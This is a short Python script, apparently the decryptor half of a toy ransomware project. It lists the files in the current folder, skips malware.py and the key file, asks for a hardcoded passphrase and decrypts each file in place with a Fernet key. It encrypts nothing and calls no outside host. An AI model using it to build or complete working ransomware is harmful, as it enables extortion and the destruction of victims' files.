
import os
from cryptography.fernet import Fernet

# lets find files


files =[]

for file in os.listdir():
	if file == "malware.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)


with open("thekey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "password"

user_phrase = input("Enter the secret key to decrypt the file\n")

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("congrats")
else:
	print("wrong one")
